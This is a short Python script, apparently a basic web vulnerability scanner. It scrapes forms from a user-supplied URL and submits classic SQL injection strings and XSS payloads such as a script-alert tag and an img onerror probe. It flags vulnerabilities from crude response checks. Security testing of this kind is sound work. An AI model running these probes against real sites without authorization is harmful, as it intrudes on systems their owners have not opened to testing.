import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# SQL Injection payloads
sql_payloads = ["' OR '1'='1", "' OR 'a'='a", "'--"]
# XSS payloads
xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]

def get_forms(url):
    soup = BeautifulSoup(requests.get(url).text, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        name = input_tag.attrs.get("name")
        input_type = input_tag.attrs.get("type", "text")
        inputs.append({"name": name, "type": input_type})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}

    for input in form_details["inputs"]:
        if input["type"] == "text":
            data[input["name"]] = payload

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def scan_sql_injection(url):
    print("\n[+] Scanning for SQL Injection...")
    forms = get_forms(url)

    for form in forms:
        details = get_form_details(form)
        for payload in sql_payloads:
            response = submit_form(details, url, payload)
            if "sql" in response.text.lower() or "database" in response.text.lower():
                print("[!] SQL Injection vulnerability detected!")
                return
    print("[-] No SQL Injection found.")

def scan_xss(url):
    print("\n[+] Scanning for XSS...")
    forms = get_forms(url)

    for form in forms:
        details = get_form_details(form)
        for payload in xss_payloads:
            response = submit_form(details, url, payload)
            if payload in response.text:
                print("[!] XSS vulnerability detected!")
                return
    print("[-] No XSS found.")

if __name__ == "__main__":
    target = input("Enter target URL (http://example.com): ")
    scan_sql_injection(target)
    scan_xss(target)
